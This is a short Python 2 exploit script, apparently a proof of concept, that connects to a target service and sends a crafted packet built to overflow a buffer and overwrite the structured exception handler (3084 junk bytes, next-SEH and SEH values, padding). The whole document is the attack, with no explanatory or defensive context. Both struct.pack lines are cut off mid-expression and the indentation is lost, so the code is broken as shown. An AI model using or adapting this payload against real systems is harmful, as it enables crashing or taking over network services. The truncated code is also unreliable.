import struct
import sys, socket
from time import *

ip = "IP_ADDR"
port = "PORT_NUM" #You can find out, how to find out IP/PORT if you RTFM :)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
s.connect((ip,port))
except:
print "Can\'t connect to peer!\n"
sys.exit(0)

junk = "\x41" * 3084
next_seh = struct.pack('
seh = struct.pack('
other_junk = "\x61" * 1424

buffer = "\x17\x00\x00\x00\x01\x09\x00\x00\x00\x31\x32\x33\x79\x6f\x77\x31"
buffer+= "\x32\x33\x01\x00\x00\x00\x50\x00\x00\x00\x00\x21\x0c\x00\x00\x08"
buffer+= "\x00\x00\x00\x6c\x7b\x1d\x0c\x15\x0c\x00\x00"+junk+next_seh+seh+other_junk

s.send(buffer) 